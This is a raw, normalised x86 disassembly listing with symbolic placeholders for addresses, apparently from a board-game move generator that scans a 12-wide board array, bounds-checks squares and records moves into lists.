lea ecx [ ecx * 4 + 0x1 ]
add ecx edx
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x10 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov edx [ rw-data ]
mov esi [ ebp + 0x8 ]
lea ecx [ edx - 0x1 ]
mov [ rw-data ] ecx
add ecx [ ebp - 0x4 ]
cmp [ esi + ecx * 4 ] 0x20
mov esi [ ebp + 0x18 ]
jne r-xdata
mov ecx [ rw-data ]
add edx 0x2
inc ecx
mov [ rw-data ] edx
mov [ rw-data ] ecx
cmp ecx 0x9
jg r-xdata
mov [ rw-data ] ecx
lea edi [ edx - 0x1 ]
mov [ rw-data ] edi
mov edi [ ebp + 0x10 ]
cmp ecx 0x1
jl r-xdata
cmp [ rw-data ] 0xa
jg r-xdata
mov ecx [ rw-data ]
cmp [ rw-data ] 0x1
jl r-xdata
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ecx * 4 + 0x1 ]
add ecx edx
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x10 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov edi [ rw-data ]
dec edi
mov [ rw-data ] edi
cmp edi 0x1
jl r-xdata
mov edx [ rw-data ]
lea edx [ edx + edx * 2 ]
shl edx 0x2
mov [ ebp - 0xc ] edx
lea ecx [ edx + edi ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0x8 ] ecx
nop [ eax ] eax
mov edx [ rw-data ]
lea ecx [ edi + edi * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edi
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0x8 ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edi
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ ebp - 0x8 ]
inc edi
add ecx 0x30
mov [ rw-data ] edi
mov [ ebp - 0x8 ] ecx
cmp edi 0x9
jle r-xdata
mov edi [ rw-data ]
dec edi
mov [ rw-data ] edi
cmp edi 0x1
jl r-xdata
mov edx [ rw-data ]
lea edx [ edx + edx * 2 ]
shl edx 0x2
mov [ ebp - 0xc ] edx
lea ecx [ edx + edi ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0x8 ] ecx
nop [ eax ] eax
mov edx [ rw-data ]
lea ecx [ edi + edi * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edi
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0x8 ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edi
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ ebp - 0x8 ]
inc edi
add ecx 0x30
mov [ rw-data ] edi
mov [ ebp - 0x8 ] ecx
cmp edi 0x9
jle r-xdata
mov edi [ rw-data ]
xor edx edx
dec edi
mov [ rw-data ] edx
mov [ rw-data ] edi
cmp edi 0x1
jl r-xdata
mov ecx [ rw-data ]
mov esi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
shl ecx 0x2
mov [ ebp - 0xc ] ecx
add ecx edi
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x18 ]
mov [ ebp - 0x8 ] ecx
test edx edx
jne r-xdata
test edx edx
jne r-xdata
mov edx [ rw-data ]
lea ecx [ edi + edi * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov edx 0x1
mov [ rw-data ] edx
inc edi
add ecx 0x30
mov [ rw-data ] edi
mov [ ebp - 0x8 ] ecx
cmp edi 0x9
jle r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edi
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0x8 ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov edi [ rw-data ]
xor edx edx
dec edi
mov [ rw-data ] edx
mov [ rw-data ] edi
cmp edi 0x1
jl r-xdata
mov ecx [ rw-data ]
mov esi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
shl ecx 0x2
mov [ ebp - 0xc ] ecx
add ecx edi
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x18 ]
mov [ ebp - 0x8 ] ecx
test edx edx
jne r-xdata
test edx edx
jne r-xdata
mov edx [ rw-data ]
lea ecx [ edi + edi * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov edx 0x1
mov [ rw-data ] edx
inc edi
add ecx 0x30
mov [ rw-data ] edi
mov [ ebp - 0x8 ] ecx
cmp edi 0x9
jle r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edi
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0x8 ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ rw-data ]
dec ecx
mov [ rw-data ] ecx
cmp ecx 0x1
jl r-xdata
mov esi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x18 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov edx [ rw-data ]
mov ecx [ rw-data ]
dec ecx
mov [ rw-data ] ecx
cmp ecx 0x1
jl r-xdata
mov esi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x18 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov edx [ rw-data ]
mov ecx [ rw-data ]
dec ecx
mov [ rw-data ] ecx
cmp ecx 0x4
jl r-xdata
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] 0x0
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0x8 ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov edx [ rw-data ]
cmp [ ecx ] 0x20
jne r-xdata
mov ecx [ rw-data ]
dec ecx
mov [ rw-data ] ecx
cmp ecx 0x4
jl r-xdata
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] 0x10
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0x8 ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov edx [ rw-data ]
cmp [ ecx ] 0x20
jne r-xdata
cmp ecx 0x8
jl r-xdata
mov edi [ ebp - 0x4 ]
lea ecx [ edx + edx * 2 ]
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x8 ]
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x10 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ ebp - 0x8 ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov edx [ rw-data ]
cmp ecx 0x1
jl r-xdata
mov edi [ ebp - 0x8 ]
lea ecx [ edx + edx * 2 ]
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x8 ]
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x10 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ ebp - 0x4 ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov edx [ rw-data ]
cmp edx 0x6
jl r-xdata
mov esi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ecx * 4 + 0x2 ]
add ecx edx
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x18 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov eax [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
cmp [ eax + ecx * 4 + 0x2c ] 0x20
mov eax [ ebp + 0x1c ]
jne r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ ebp - 0x4 ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
cmp edx 0x1
jl r-xdata
mov esi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ecx * 4 + 0x2 ]
add ecx edx
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x18 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov ecx [ rw-data ]
mov eax [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
cmp [ eax + ecx * 4 + 0x2c ] 0x20
mov eax [ ebp + 0x1c ]
jne r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ ebp - 0x4 ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ rw-data ]
add edx 0xfffffffe
inc ecx
mov [ rw-data ] edx
mov [ rw-data ] ecx
cmp ecx 0x9
jg r-xdata
mov ecx [ rw-data ]
dec ecx
mov [ rw-data ] edx
mov [ rw-data ] ecx
cmp ecx 0x1
jl r-xdata
cmp edx 0xa
jg r-xdata
cmp [ rw-data ] 0x1
jl r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ecx * 4 + 0x1 ]
add ecx edx
lea ecx [ eax + ecx * 4 ]
mov eax [ ebp + 0x1c ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov esi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ecx * 4 - 0x1 ]
add ecx edx
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x18 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ rw-data ]
add edx 0xfffffffe
inc ecx
mov [ rw-data ] edx
mov [ rw-data ] ecx
cmp ecx 0x9
jg r-xdata
mov ecx [ rw-data ]
dec ecx
mov [ rw-data ] edx
mov [ rw-data ] ecx
cmp ecx 0x1
jl r-xdata
cmp edx 0xa
jg r-xdata
cmp [ rw-data ] 0x1
jl r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ecx * 4 + 0x1 ]
add ecx edx
lea ecx [ eax + ecx * 4 ]
mov eax [ ebp + 0x1c ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov esi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ecx * 4 - 0x1 ]
add ecx edx
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x18 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov ecx [ rw-data ]
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ rw-data ]
lea edx [ ecx + ecx * 2 ]
shl edx 0x2
mov [ ebp - 0xc ] edx
lea ecx [ edx + edi ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0xc ]
mov edx [ ebp + 0x8 ]
add ecx edi
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
xor edx edx
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edi
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0x8 ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edi
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ ebp - 0x8 ]
dec edi
sub ecx 0x30
mov [ rw-data ] edi
mov [ ebp - 0x8 ] ecx
cmp edi 0x1
jge r-xdata
mov edx [ rw-data ]
cmp [ ecx ] 0x20
jne r-xdata
jmp r-xdata
mov ecx [ rw-data ]
lea edx [ ecx + ecx * 2 ]
shl edx 0x2
mov [ ebp - 0xc ] edx
lea ecx [ edx + edi ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0xc ]
mov edx [ ebp + 0x8 ]
add ecx edi
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
xor edx edx
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edi
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0x8 ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edi
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ ebp - 0x8 ]
dec edi
sub ecx 0x30
mov [ rw-data ] edi
mov [ ebp - 0x8 ] ecx
cmp edi 0x1
jge r-xdata
mov edx [ rw-data ]
cmp [ ecx ] 0x20
jne r-xdata
jmp r-xdata
mov ecx [ rw-data ]
mov esi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
shl ecx 0x2
mov [ ebp - 0xc ] ecx
add ecx edi
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x18 ]
mov [ ebp - 0x8 ] ecx
nop [ eax + eax ] eax
test edx edx
jne r-xdata
test edx edx
jne r-xdata
mov edx [ rw-data ]
lea ecx [ edi + edi * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov edx 0x1
mov [ rw-data ] edx
dec edi
sub ecx 0x30
mov [ rw-data ] edi
mov [ ebp - 0x8 ] ecx
cmp edi 0x1
jge r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edi
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0x8 ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edi
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
cmp [ ecx ] 0x20
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov ecx [ ebp - 0x8 ]
jmp r-xdata
mov ecx [ rw-data ]
mov esi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
shl ecx 0x2
mov [ ebp - 0xc ] ecx
add ecx edi
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x18 ]
mov [ ebp - 0x8 ] ecx
nop [ eax + eax ] eax
test edx edx
jne r-xdata
test edx edx
jne r-xdata
mov edx [ rw-data ]
lea ecx [ edi + edi * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov edx 0x1
mov [ rw-data ] edx
dec edi
sub ecx 0x30
mov [ rw-data ] edi
mov [ ebp - 0x8 ] ecx
cmp edi 0x1
jge r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edi
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0x8 ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edi
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
cmp [ ecx ] 0x20
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov ecx [ ebp - 0x8 ]
jmp r-xdata
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov edi [ ebp + 0x10 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
inc edx
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov edi [ ebp + 0x10 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
inc edx
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov edx [ rw-data ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov edi [ ebp + 0x10 ]
mov [ edx + ecx * 4 ] 0x0
mov ecx [ eax ]
mov edx [ rw-data ]
inc edx
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0x8 ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov edx [ rw-data ]
mov edx [ rw-data ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov edi [ ebp + 0x10 ]
mov [ edx + ecx * 4 ] 0x10
mov ecx [ eax ]
mov edx [ rw-data ]
inc edx
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0x8 ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov edx [ rw-data ]
lea ecx [ edx + edx * 2 ]
mov edx [ ebp - 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ ebp - 0x4 ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
lea ecx [ edx + edx * 2 ]
mov edx [ ebp - 0x4 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ ebp - 0x8 ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
